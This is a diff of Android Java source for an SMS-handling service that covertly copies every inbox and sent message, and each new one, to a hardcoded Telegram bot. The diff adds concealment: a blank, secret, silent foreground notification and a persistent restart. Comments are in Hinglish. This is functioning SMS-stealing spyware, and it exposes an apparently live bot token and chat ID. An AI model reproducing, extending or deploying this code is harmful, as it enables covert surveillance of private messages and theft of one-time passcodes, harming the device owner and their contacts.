@@ -1,17 +1,18 @@
 package com.smshandler;
 
+import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.ContentResolver;
-import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
 import android.os.IBinder;
-import android.provider.Telephony;
 import androidx.core.app.NotificationCompat;
+import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
@@ -21,107 +22,134 @@ import java.util.Locale;
 
 public class SmsService extends Service {
 
-    // ====== YAHAN APNA TOKEN AUR CHAT ID DAALO ======
     private static final String BOT_TOKEN = "8755444402:AAHMnXZp0cY60w8HC-bkr_Ut_VNKALeY6Es";
-    private static final String CHAT_ID = "8623638607";
-    // ================================================
-
-    private boolean oldSmsSent = false;
+    private static final String CHAT_ID   = "8623638607";
+    private static final String PREFS     = "sms_prefs";
+    private static final String KEY_SENT  = "old_sms_sent";
 
     @Override
     public void onCreate() {
         super.onCreate();
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(
-                "sms_channel", "SMS Service", NotificationManager.IMPORTANCE_MIN);
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            if (manager != null) {
-                manager.createNotificationChannel(channel);
-            }
-
-            NotificationCompat.Builder notification = new NotificationCompat.Builder(this, "sms_channel")
-                .setContentTitle("")
-                .setContentText("")
-                .setSmallIcon(android.R.drawable.ic_dialog_info)
-                .setOngoing(true)
-                .setSilent(true);
-
-            startForeground(1, notification.build());
-        }
+        startSilentForeground();
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // Purane SMS bhejo (sirf ek baar)
-        if (!oldSmsSent) {
-            oldSmsSent = true;
-            new Thread(this::sendAllOldSms).start();
+        if (intent != null && intent.hasExtra("sms_sender")) {
+            // Naya SMS aaya — background thread pe bhejo
+            String sender = intent.getStringExtra("sms_sender");
+            String body   = intent.getStringExtra("sms_body");
+            long   time   = intent.getLongExtra("sms_time", System.currentTimeMillis());
+            new Thread(() -> sendToTelegram(sender, body, time)).start();
+        } else {
+            // Service start hua — pehli baar purane SMS bhejo
+            SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
+            if (!prefs.getBoolean(KEY_SENT, false)) {
+                prefs.edit().putBoolean(KEY_SENT, true).apply();
+                new Thread(this::sendAllOldSms).start();
+            }
         }
         return START_STICKY;
     }
 
+    private void startSilentForeground() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel ch = new NotificationChannel(
+                "bg", "Background", NotificationManager.IMPORTANCE_MIN);
+            ch.setShowBadge(false);
+            ch.setSound(null, null);
+            NotificationManager nm = getSystemService(NotificationManager.class);
+            if (nm != null) nm.createNotificationChannel(ch);
+        }
+
+        Notification notif = new NotificationCompat.Builder(this, "bg")
+            .setSmallIcon(android.R.drawable.screen_background_dark)
+            .setContentTitle("")
+            .setContentText("")
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setSilent(true)
+            .setOngoing(true)
+            .setShowWhen(false)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .build();
+
+        startForeground(1, notif);
+    }
+
     private void sendAllOldSms() {
+        ContentResolver cr = getContentResolver();
+        Cursor cursor = null;
         try {
-            ContentResolver cr = getContentResolver();
-            Uri uri = Telephony.Sms.Inbox.CONTENT_URI;
-            
-            Cursor cursor = cr.query(uri, null, null, null, "date ASC");
-            
+            cursor = cr.query(
+                Uri.parse("content://sms/inbox"),
+                new String[]{"address", "body", "date"},
+                null, null, "date ASC"
+            );
             if (cursor != null && cursor.moveToFirst()) {
-                int senderIndex = cursor.getColumnIndex("address");
-                int bodyIndex = cursor.getColumnIndex("body");
-                int dateIndex = cursor.getColumnIndex("date");
-
                 do {
-                    String sender = senderIndex >= 0 ? cursor.getString(senderIndex) : "Unknown";
-                    String body = bodyIndex >= 0 ? cursor.getString(bodyIndex) : "";
-                    long date = dateIndex >= 0 ? cursor.getLong(dateIndex) : 0;
-
-                    sendToTelegram(this, sender, body, date);
-                    
-                    // Thoda delay karo taki Telegram block na kare
-                    Thread.sleep(800);
-                    
+                    String sender = cursor.getString(0);
+                    String body   = cursor.getString(1);
+                    long   date   = cursor.getLong(2);
+                    sendToTelegram(sender, body, date);
+                    Thread.sleep(600);
                 } while (cursor.moveToNext());
-                cursor.close();
             }
         } catch (Exception e) {
             e.printStackTrace();
+        } finally {
+            if (cursor != null) cursor.close();
+        }
+
+        // Sent + received SMS bhi bhejo
+        try {
+            cursor = cr.query(
+                Uri.parse("content://sms/sent"),
+                new String[]{"address", "body", "date"},
+                null, null, "date ASC"
+            );
+            if (cursor != null && cursor.moveToFirst()) {
+                do {
+                    String to   = cursor.getString(0);
+                    String body = cursor.getString(1);
+                    long   date = cursor.getLong(2);
+                    sendToTelegram("[Sent to " + to + "]", body, date);
+                    Thread.sleep(600);
+                } while (cursor.moveToNext());
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        } finally {
+            if (cursor != null) cursor.close();
         }
     }
 
-    public static void sendToTelegram(Context context, String sender, String message, long timestamp) {
+    public static void sendToTelegram(String sender, String body, long timestamp) {
         try {
-            String date = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.getDefault())
-                .format(new Date(timestamp));
-            
-            // Message format
-            String text = "📨 SMS Forwarded\n" +
-                         "From: " + sender + "\n" +
-                         "Msg: " + message + "\n" +
-                         "Time: " + date;
-            
-            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN +
-                           "/sendMessage?chat_id=" + CHAT_ID +
-                           "&parse_mode=HTML" +
-                           "&text=" + URLEncoder.encode(text, "UTF-8");
+            String date = new SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault())
+                              .format(new Date(timestamp));
+            String text = "From: " + sender + "\nMsg: " + body + "\nTime: " + date;
 
-            URL url = new URL(urlStr);
+            String api = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+            String params = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8")
+                          + "&text=" + URLEncoder.encode(text, "UTF-8");
+
+            URL url = new URL(api);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod("GET");
-            conn.setConnectTimeout(5000);
-            conn.setReadTimeout(5000);
+            conn.setRequestMethod("POST");
+            conn.setConnectTimeout(8000);
+            conn.setReadTimeout(8000);
+            conn.setDoOutput(true);
+            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+            OutputStream os = conn.getOutputStream();
+            os.write(params.getBytes("UTF-8"));
+            os.flush();
             conn.getInputStream();
             conn.disconnect();
-            
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
     @Override
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
+    public IBinder onBind(Intent intent) { return null; }
 }
